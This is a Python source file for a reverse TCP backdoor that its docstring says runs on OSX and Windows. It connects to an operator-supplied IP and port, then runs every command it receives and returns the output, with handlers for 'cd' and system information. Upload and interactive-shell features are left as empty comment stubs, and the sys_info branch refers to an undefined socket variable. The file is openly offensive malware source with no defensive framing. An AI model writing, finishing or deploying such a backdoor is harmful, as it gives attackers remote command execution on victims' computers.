import socket
import os
import platform
import http.server
import utils


"""
Reverse TCP backdoor works on OSX and Windows
"""

def main():
    args = utils.init_argparse('TCP Reverse Shell')
    port = args.port
    ip = args.ip

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((ip, port))
        
        while True:
            cmd = utils.recv_data(s)

            if cmd.strip() == 'exit':
                utils.send_data(s, b'[+] Terminating remote session.')
                break

            out = handle_cmd(cmd)
            utils.send_data(s, out)

    

def handle_cmd(cmd):
    keyword = cmd.split(' ')[0]

    # change directories
    if keyword == 'cd':
        dir = cmd.split('cd')[1].strip()

        try:
            os.chdir(dir)
            return os.getcwd()
        except FileNotFoundError:
            return '{dir} does not exist.'.format(dir=dir)

    # get system information
    if keyword == 'sys_info':
        s.sendall(utils.sys_info())

    # upload a file

    # get an interactive shell

    # help

    # execute command as is
    else:
       return utils.execute_cmd(cmd).decode()

if __name__ == '__main__':
    main()